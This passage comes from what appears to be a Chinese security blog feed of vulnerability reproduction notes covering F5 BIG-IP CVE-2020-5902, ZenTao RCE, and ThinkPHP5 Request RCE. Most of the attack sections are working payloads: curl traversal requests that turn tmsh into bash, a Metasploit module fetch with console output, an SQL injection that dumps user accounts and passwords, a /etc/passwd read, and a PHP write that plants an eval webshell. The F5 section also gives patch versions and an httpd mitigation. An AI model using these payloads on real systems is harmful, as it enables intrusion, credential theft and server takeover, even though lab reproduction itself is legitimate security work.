class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**msf use**</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;sh</span><br><span class="line">wget -P &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;modules&#x2F;exploits&#x2F;linux&#x2F;http&#x2F; https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;rapid7&#x2F;metasploit-framework&#x2F;0417e88ff24bf05b8874c953bd91600f10186ba4&#x2F;modules&#x2F;exploits&#x2F;linux&#x2F;http&#x2F;f5_bigip_tmui_rce.rb</span><br><span class="line">reload_all</span><br><span class="line">exploit&#x2F;linux&#x2F;http&#x2F;f5_bigip_tmui_rce 2020-06-30 excellent Yes F5 BIG-IP TMUI Directory Traversal and File Upload RCE</span><br><span class="line">╭─root@kali ~ </span><br><span class="line">╰─# msfconsole </span><br><span class="line">                                                  </span><br><span class="line">     ,           ,</span><br><span class="line">    &#x2F;             \</span><br><span class="line">   ((__---,,,---__))</span><br><span class="line">      (_) O O (_)_________</span><br><span class="line">         \ _ &#x2F;            |\</span><br><span class="line">          o_o \   M S F   | \</span><br><span class="line">               \   _____  |  *</span><br><span class="line">                |||   WW|||</span><br><span class="line">                |||     |||</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       &#x3D;[ metasploit v5.0.87-dev                          ]</span><br><span class="line">+ -- --&#x3D;[ 2007 exploits - 1096 auxiliary - 343 post       ]</span><br><span class="line">+ -- --&#x3D;[ 562 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --&#x3D;[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit tip: After running db_nmap, be sure to check out the result of hosts and services</span><br><span class="line"></span><br><span class="line">msf5 &gt; reload_all </span><br><span class="line">[*] Reloading modules from all module paths...</span><br><span class="line">               .;lxO0KXXXK0Oxl:.</span><br><span class="line">           ,o0WMMMMMMMMMMMMMMMMMMKd,</span><br><span class="line">        &#39;xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,</span><br><span class="line">      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:</span><br><span class="line">    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,</span><br><span class="line">   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo</span><br><span class="line">  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk</span><br><span class="line"> oMMMMMMMMMMx.                    dMMMMMMMMMMx</span><br><span class="line">.WMMMMMMMMM:                       :MMMMMMMMMM,</span><br><span class="line">xMMMMMMMMMo                         lMMMMMMMMMO</span><br><span class="line">NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;</span><br><span class="line">MMMMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:</span><br><span class="line">NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:</span><br><span class="line">xMMMMMMMMMd                        ,0MMMMMMMMMMK;</span><br><span class="line">.WMMMMMMMMMc                         &#39;OMMMMMM0,</span><br><span class="line"> lMMMMMMMMMMk.                         .kMMO&#39;</span><br><span class="line">  dMMMMMMMMMMWd&#39;                         ..</span><br><span class="line">   cWMMMMMMMMMMMNxc&#39;.                ##########</span><br><span class="line">    .0MMMMMMMMMMMMMMMMWc            #+#    #+#</span><br><span class="line">      ;0MMMMMMMMMMMMMMMo.          +:+</span><br><span class="line">        .dNMMMMMMMMMMMMo          +#++:++#+</span><br><span class="line">           &#39;oOWMMMMMMMMo                +:+</span><br><span class="line">               .,cdkO0K;        :+:    :+:                                </span><br><span class="line">                                :::::::+:</span><br><span class="line">                      Metasploit</span><br><span class="line"></span><br><span class="line">       &#x3D;[ metasploit v5.0.87-dev                          ]</span><br><span class="line">+ -- --&#x3D;[ 2007 exploits - 1096 auxiliary - 343 post       ]</span><br><span class="line">+ -- --&#x3D;[ 562 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --&#x3D;[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit tip: Save the current environment with the save command, future console restarts will use this environment again</span><br><span class="line"></span><br><span class="line">msf5 &gt; search f5_bigip</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   #  Name                                            Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                            ---------------  ----       -----  -----------</span><br><span class="line">   0  auxiliary&#x2F;dos&#x2F;http&#x2F;f5_bigip_apm_max_sessions                     normal     No     F5 BigIP Access Policy Manager Session Exhaustion Denial of Service</span><br><span class="line">   1  auxiliary&#x2F;gather&#x2F;f5_bigip_cookie_disclosure                      normal     No     F5 BigIP Backend Cookie Disclosure</span><br><span class="line">   2  auxiliary&#x2F;scanner&#x2F;http&#x2F;f5_bigip_virtual_server                   normal     No     F5 BigIP HTTP Virtual Server Scanner</span><br><span class="line">   3  exploit&#x2F;linux&#x2F;ssh&#x2F;f5_bigip_known_privkey        2012-06-11       excellent  No     F5 BIG-IP SSH Private Key Exposure</span><br><span class="line">   4  exploit&#x2F;linux&#x2F;http&#x2F;f5_bigip_tmui_rce            2020-06-30       excellent  Yes    F5 BIG-IP TMUI Directory Traversal and File Upload RCE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 &gt;</span><br></pre></td></tr></table></figure><h3 id="执行tmsh命令"><a href="#执行tmsh命令" class="headerlink" title="执行tmsh命令"></a>执行tmsh命令</h3><p> <strong>tmshCmd.jsp + fileSave.jsp = Linux RCE</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. tmshCmd.jsp?command&#x3D;create+cli+alias+private+list+command+bash</span><br><span class="line">2. fileSave.jsp?fileName&#x3D;&#x2F;tmp&#x2F;cmd&amp;content&#x3D;id</span><br><span class="line">3. tmshCmd.jsp?command&#x3D;list+&#x2F;tmp&#x2F;cmd</span><br><span class="line">4. tmshCmd.jsp?command&#x3D;delete+cli+alias+private+list</span><br></pre></td></tr></table></figure><ol><li>修改alias劫持list命令为bash</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -k &quot;https:&#x2F;&#x2F;example.com&#x2F;tmui&#x2F;login.jsp&#x2F;..;&#x2F;tmui&#x2F;locallb&#x2F;workspace&#x2F;tmshCmd.jsp?command&#x3D;create+cli+alias+private+list+command+bash&quot;</span><br></pre></td></tr></table></figure><ol start="2"><li>写入bash文件</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -k &quot;https:&#x2F;&#x2F;example.com&#x2F;tmui&#x2F;login.jsp&#x2F;..;&#x2F;tmui&#x2F;locallb&#x2F;workspace&#x2F;fileSave.jsp?fileName&#x3D;&#x2F;tmp&#x2F;test&amp;content&#x3D;id&quot;</span><br></pre></td></tr></table></figure><ol start="3"><li>执行bash文件</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -k &quot;https:&#x2F;&#x2F;example.com&#x2F;tmui&#x2F;login.jsp&#x2F;..;&#x2F;tmui&#x2F;locallb&#x2F;workspace&#x2F;tmshCmd.jsp?command&#x3D;list+&#x2F;tmp&#x2F;test&quot;</span><br></pre></td></tr></table></figure><ol start="4"><li>还原list命令</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -k &quot;https:&#x2F;&#x2F;example.com&#x2F;tmui&#x2F;login.jsp&#x2F;..;&#x2F;tmui&#x2F;locallb&#x2F;workspace&#x2F;tmshCmd.jsp?command&#x3D;delete+cli+alias+private+list&quot;</span><br></pre></td></tr></table></figure><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><h3 id="通用修补建议："><a href="#通用修补建议：" class="headerlink" title="通用修补建议："></a>通用修补建议：</h3><p>升级到以下版本</p><ul><li>BIG-IP 15.x: 15.1.0.4</li><li>BIG-IP 14.x: 14.1.2.6</li><li>BIG-IP 13.x: 13.1.3.4</li><li>BIG-IP 12.x: 12.1.5.2</li><li>BIG-IP 11.x: 11.6.5.2</li></ul><h3 id="临时修补建议："><a href="#临时修补建议：" class="headerlink" title="临时修补建议："></a>临时修补建议：</h3><p>官方建议可以通过以下步骤临时缓解影响</p><p>1) 使用以下命令登录对应系统</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmsh</span><br></pre></td></tr></table></figure><p>2) 编辑 <code>httpd</code> 组件的配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit &#x2F;sys httpd all-properties</span><br></pre></td></tr></table></figure><p>3) 文件内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">include &#39;</span><br><span class="line">&lt;LocationMatch &quot;.*\.\.;.*&quot;&gt;</span><br><span class="line">Redirect 404 &#x2F;</span><br><span class="line">&lt;&#x2F;LocationMatch&gt;</span><br><span class="line">&#39;</span><br></pre></td></tr></table></figure><p>4) 按照如下操作保存文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">按下 ESC 并依次输入</span><br><span class="line">:wq</span><br></pre></td></tr></table></figure><p>5) 执行命令刷新配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">save &#x2F;sys config</span><br></pre></td></tr></table></figure><p>6) 重启 httpd 服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">restart sys service httpd</span><br></pre></td></tr></table></figure><p>建议同时禁止外部IP对于TMUI的访问，或只允许管理人员在安全网络环境下访问来缓解漏洞</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/jas502n/CVE-2020-5902" target="_blank" rel="noopener">CVE-2020-5902 BIG-IP</a></p><p><a href="https://cert.360.cn/warning/detail?id=a1768348bde7807647cbc7232edce7df" target="_blank" rel="noopener">【利用公开】CVE-2020-5902: F5 BIG-IP 远程代码执行漏洞通告</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;CVE-2020-5902：F5-BIG-IP-远程代码执行漏洞复现&quot;&gt;&lt;a href=&quot;#CVE-2020-5902：F5-BIG-IP-远程代码执行漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;CVE-2020-5902：F5 BIG-IP 远程代码执行漏洞复现&quot;&gt;&lt;/a&gt;CVE-2020-5902：F5 BIG-IP 远程代码执行漏洞复现&lt;/h1&gt;&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;F5 BIG-IP 是美国F5公司一款集成流量管理、DNS、出入站规则、web应用防火墙、web网关、负载均衡等功能的应用交付平台。&lt;/p&gt;
&lt;h2 id=&quot;漏洞概述&quot;&gt;&lt;a href=&quot;#漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;漏洞概述&quot;&gt;&lt;/a&gt;漏洞概述&lt;/h2&gt;&lt;p&gt;2020年7月1日，F5官方公布流量管理用户界面（TMUI）存在 前台远程执行代码（RCE）漏洞（CVE-2020-5902）。攻击者利用该漏洞，构造恶意请求，在未授权的情况下获得目标服务器的权限，实现远程代码执行。&lt;/p&gt;
&lt;p&gt;未授权的远程攻击者通过向漏洞页面发送特制的请求包，可以造成任意 Java 代码执行。进而控制 F5 BIG-IP的全部功能，包括但不限于: 执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等。该漏洞影响控制面板受影响，不影响数据面板。&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="RCE" scheme="http://yoursite.com/tags/RCE/"/>
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="BIG-IP" scheme="http://yoursite.com/tags/BIG-IP/"/>
    
      <category term="F5" scheme="http://yoursite.com/tags/F5/"/>
    
  </entry>
  
  <entry>
    <title>禅道全版本rce漏洞复现笔记</title>
    <link href="http://yoursite.com/2020/07/11/%E7%A6%85%E9%81%93%E5%85%A8%E7%89%88%E6%9C%ACrce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/07/11/%E7%A6%85%E9%81%93%E5%85%A8%E7%89%88%E6%9C%ACrce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-07-11T10:54:56.000Z</published>
    <updated>2020-07-11T10:59:10.297Z</updated>
    
    <content type="html"><![CDATA[<h1 id="禅道全版本rce漏洞复现笔记"><a href="#禅道全版本rce漏洞复现笔记" class="headerlink" title="禅道全版本rce漏洞复现笔记"></a>禅道全版本rce漏洞复现笔记</h1><h2 id="漏洞说明"><a href="#漏洞说明" class="headerlink" title="漏洞说明"></a>漏洞说明</h2><p><a href="https://www.zentao.net/" target="_blank" rel="noopener">禅道项目管理软件</a>是一款国产的，基于LGPL协议，开源免费的项目管理软件，它集产品管理、项目管理、测试管理于一体，同时还包含了事务管理、组织管理等诸多功能，是中小型企业项目管理的首选，基于自主的PHP开发框架──ZenTaoPHP而成，第三方开发者或企业可非常方便的开发插件或者进行定制。<br>此次发现的漏洞正是ZenTaoPHP框架中的通用代码所造成的的，因此禅道几乎所有的项目都受此漏洞影响。本次漏洞复现以ZenTaoPMS.11.6版本作为演示</p><a id="more"></a><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载链接：<a href="https://www.zentao.net/download/80153.html" target="_blank" rel="noopener">https://www.zentao.net/download/80153.html</a></p><p>解压安装后访问禅道主页 <a href="http://127.0.0.1/index.php" target="_blank" rel="noopener">http://127.0.0.1/index.php</a></p><p><img src="/2020/07/11/%E7%A6%85%E9%81%93%E5%85%A8%E7%89%88%E6%9C%ACrce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/1.png" alt="1"></p><p>查看当前版本 <a href="http://127.0.0.1:81/zentao/index.php?mode=getconfig" target="_blank" rel="noopener">http://127.0.0.1:81/zentao/index.php?mode=getconfig</a></p><p><img src="/2020/07/11/%E7%A6%85%E9%81%93%E5%85%A8%E7%89%88%E6%9C%ACrce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/2.png" alt="2"></p><p>至此环境搭建成功</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="漏洞1-SQL注入"><a href="#漏洞1-SQL注入" class="headerlink" title="漏洞1 SQL注入"></a>漏洞1 SQL注入</h3><p>首先我们登录admin/CD87691043cs账户修改默认密码，创建一个普通Test0001/1qaz2wsx3edc!@#$用户并登录</p><blockquote><p> Payload </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;zentao&#x2F;api-getModel-api-sql-sql&#x3D;select+account,password+from+zt_user</span><br></pre></td></tr></table></figure><p>Poc访问结果如下：</p><p><img src="/2020/07/11/%E7%A6%85%E9%81%93%E5%85%A8%E7%89%88%E6%9C%ACrce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/3.png" alt="3"></p><h3 id="漏洞2-文件读取"><a href="#漏洞2-文件读取" class="headerlink" title="漏洞2 文件读取"></a>漏洞2 文件读取</h3><blockquote><p>Payload </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;zentao&#x2F;api-getModel-file-parseCSV-fileName&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>Poc访问结果如下：</p><p><img src="/2020/07/11/%E7%A6%85%E9%81%93%E5%85%A8%E7%89%88%E6%9C%ACrce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/4.png" alt="4"></p><p>由于本地环境是window系统，所以没有回显，我们在xampp\zentao\module\api目录下新建一个test文件，读取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;zentao&#x2F;api-getModel-file-parseCSV-fileName&#x3D;test</span><br></pre></td></tr></table></figure><p><img src="/2020/07/11/%E7%A6%85%E9%81%93%E5%85%A8%E7%89%88%E6%9C%ACrce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/5.png" alt="5"></p><h3 id="漏洞3-RCE"><a href="#漏洞3-RCE" class="headerlink" title="漏洞3 RCE"></a>漏洞3 RCE</h3><p>利用上面的文件读取来执行命令</p><blockquote><p>Payload1</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/zentao/api-getModel-editor-save-filePath=1111</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: lang=zh-cn; device=desktop; theme=default; windowWidth=2426; windowHeight=796; zentaosid=vqruohhgn7qbhveakg04h9e267</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 29</span><br><span class="line"></span><br><span class="line">fileContent=&lt;?php phpinfo()?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/11/%E7%A6%85%E9%81%93%E5%85%A8%E7%89%88%E6%9C%ACrce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/6.png" alt="6"></p><p>先写入一个phpinfo，再读取访问</p><p>需要给物理路径加上一层才能包含成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;zentao&#x2F;api-getModel-api-getMethod-filePath&#x3D;1111&#x2F;1</span><br></pre></td></tr></table></figure><p><img src="/2020/07/11/%E7%A6%85%E9%81%93%E5%85%A8%E7%89%88%E6%9C%ACrce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/7.png" alt="7"></p><blockquote><p>Payload2</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fileContent&#x3D;&lt;?php system(&#39;whoami&#39;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/11/%E7%A6%85%E9%81%93%E5%85%A8%E7%89%88%E6%9C%ACrce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/8.png" alt="8"></p><p><img src="/2020/07/11/%E7%A6%85%E9%81%93%E5%85%A8%E7%89%88%E6%9C%ACrce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/9.png" alt="9"></p><blockquote><p>Payload3(一句话)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fileContent&#x3D;&lt;?php file_put_contents(&#39;E:&#x2F;&#x2F;CMS&#x2F;ZenTaoPMS&#x2F;xampp&#x2F;zentao&#x2F;www&#x2F;xxx.php.aaa&#39;, &#39;&lt;?php @eval($_REQUEST[&quot;x&quot;]);?&gt;&#39;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/11/%E7%A6%85%E9%81%93%E5%85%A8%E7%89%88%E6%9C%ACrce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/10.png" alt="10"></p><p>这里是window系统，所以写入绝对路径，绝对路径可以同样用<code>fileContent=&lt;?php getcwd()?&gt;</code>获取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;zentao&#x2F;xxx.php.aaa?x&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><p><img src="/2020/07/11/%E7%A6%85%E9%81%93%E5%85%A8%E7%89%88%E6%9C%ACrce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/11.png" alt="11"></p><p><em>PS:最好使用linux系统安装，windows不要使用一键安装包安装，windows系统安装集成版的话根目录下的php代码好像做了限制，无法执行。</em></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.jianshu.com/p/62bb128ecbdb" target="_blank" rel="noopener">【渗透笔记】禅道</a></p><p><a href="http://foreversong.cn/archives/1410" target="_blank" rel="noopener">禅道全版本rce漏洞分析</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;禅道全版本rce漏洞复现笔记&quot;&gt;&lt;a href=&quot;#禅道全版本rce漏洞复现笔记&quot; class=&quot;headerlink&quot; title=&quot;禅道全版本rce漏洞复现笔记&quot;&gt;&lt;/a&gt;禅道全版本rce漏洞复现笔记&lt;/h1&gt;&lt;h2 id=&quot;漏洞说明&quot;&gt;&lt;a href=&quot;#漏洞说明&quot; class=&quot;headerlink&quot; title=&quot;漏洞说明&quot;&gt;&lt;/a&gt;漏洞说明&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zentao.net/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;禅道项目管理软件&lt;/a&gt;是一款国产的，基于LGPL协议，开源免费的项目管理软件，它集产品管理、项目管理、测试管理于一体，同时还包含了事务管理、组织管理等诸多功能，是中小型企业项目管理的首选，基于自主的PHP开发框架──ZenTaoPHP而成，第三方开发者或企业可非常方便的开发插件或者进行定制。&lt;br&gt;此次发现的漏洞正是ZenTaoPHP框架中的通用代码所造成的的，因此禅道几乎所有的项目都受此漏洞影响。本次漏洞复现以ZenTaoPMS.11.6版本作为演示&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="RCE" scheme="http://yoursite.com/tags/RCE/"/>
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="禅道" scheme="http://yoursite.com/tags/%E7%A6%85%E9%81%93/"/>
    
      <category term="zentao" scheme="http://yoursite.com/tags/zentao/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5 核心类 Request 远程代码漏洞分析</title>
    <link href="http://yoursite.com/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/07/11/ThinkPHP5-%E6%A0%B8%E5%BF%83%E7%B1%BB-Request-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-07-11T10:47:35.000Z</published>
    <updated>2020-07-11T10:59:33.633Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ThinkPHP5-核心类-Request-远程代码漏洞复现-Poc"><a href="#ThinkPHP5-核心类-Request-远程代码漏洞复现-Poc" class="headerlink" title="ThinkPHP5 核心类 Request 远程代码漏洞复现+Poc"></a>ThinkPHP5 核心类 Request 远程代码漏洞复现+Poc</h1><h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>2019年1月11日，ThinkPHP团队发布了一个<a href="https://blog.thinkphp.cn/910675" target="_blank" rel="noopener">补丁更新</a>，修复了一处由于不安全的动态函数调用导致的远程代码执行漏洞。</p><p>ThinkPHP官方发布新版本5.0.24，在1月14日和15日又接连发布两个更新，这三次更新都修复了一个安全问题，该问题可能导致远程代码执行 ，这是ThinkPHP近期的第二个高危漏洞，两个漏洞均是无需登录即可远程触发，危害极大。</p><p>之前写过一篇文章《<a href="https://chaceshadow.github.io/2020/06/09/ThinkPHP-5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-POC/#method%E4%BB%BB%E6%84%8F%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95%E5%AF%BC%E8%87%B4rce" target="_blank" rel="noopener">ThinkPHP-5-代码执行漏洞复现-POC</a>》里面有提过一次，这篇文章主要对其不同版本下进行详细的复现。</p><a id="more"></a><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>启明星辰ADLab安全研究员对ThinkPHP的多个版本进行源码分析和验证后，确认具体受影响的版本为ThinkPHP5.0-5.0.23完整版。</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>本地环境采用ThinkPHP 5.0.10和5.0.22完整版+PHP7.0.9+Apache2.4.39进行复现。安装环境后执行POC即可执行系统命令</p><h2 id="版本-5-0-0-5-0-12"><a href="#版本-5-0-0-5-0-12" class="headerlink" title="版本 5.0.0-5.0.12"></a>版本 5.0.0-5.0.12</h2><blockquote><p>Payload：</p></blockquote><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/public/index.php?s=index/index/index</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.236</span><br><span class="line"><span class="attribute">Content-Length</span>: 48</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span 